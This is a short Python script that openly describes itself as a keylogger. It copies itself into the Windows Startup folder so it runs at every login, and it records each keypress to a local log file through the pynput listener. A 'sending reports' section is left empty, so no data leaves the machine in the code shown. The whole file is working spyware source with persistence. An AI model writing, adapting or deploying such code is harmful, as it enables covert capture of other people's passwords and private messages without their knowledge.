import socket

def is_connected():
    try:
        # connect to the host -- tells us if the host is actually
        # reachable
        socket.create_connection(("1.1.1.1", 53))
        return True
    except OSError:
        pass
    return False


# config for getting secrets from env
import os
from dotenv import load_dotenv

load_dotenv()
# config ends

# now back to the keylogger
from pynput.keyboard import Listener
import logging
from shutil import copyfile

username = os.getlogin()

copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py')

logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

with open("log.txt", "w") as f:
    secret = f.writelines('')

# sending reports


# back to keylogging

def key_handler(key):
    k = str(key).replace("'", "")
    logging.info(k)


with Listener(on_press=key_handler)as listener:
    listener.join()
